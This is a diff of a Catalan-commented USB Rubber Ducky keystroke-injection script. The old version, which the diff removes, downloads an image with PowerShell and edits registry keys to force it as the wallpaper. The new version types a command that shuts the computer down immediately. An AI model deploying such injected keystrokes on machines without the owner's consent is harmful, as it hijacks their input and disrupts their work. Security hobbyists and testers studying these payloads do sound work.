@@ -13,27 +13,15 @@ REM              Visca la terra lliure i mori el mal govern
 REM 
 REM 00110100 01011000 01110011 01100001 01101101 01110000 01101100 01100101
 
-REM Aquest script cambiarà el fons d'escriptori per una imatge que descarrega d'internet amb un Rubber Ducky
+REM Aquest script apagarà l'ordinador amb un Rubber Ducky
 
-DELAY 500
+DELAY 1000
 GUI r
 DELAY 500
 STRING cmd
 DELAY 500
 ENTER
 DELAY 500
-STRING powershell -Command "Invoke-WebRequest -Uri 'https://images.pexels.com/photos/1933239/pexels-photo-1933239.jpeg' -OutFile 'C:\image.jpg'"
-DELAY 500
-ENTER
-DELAY 500
-STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\image.jpg" /f
-DELAY 500
-ENTER
-DELAY 500
-STRING reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v Wallpaper /t REG_SZ /d "C:\image.jpg" /f
-DELAY 500
-ENTER
-DELAY 500
-STRING rundll32.exe user32.dll,UpdatePerUserSystemParameters
+STRING shutdown /s /t 0
 DELAY 500
 ENTER
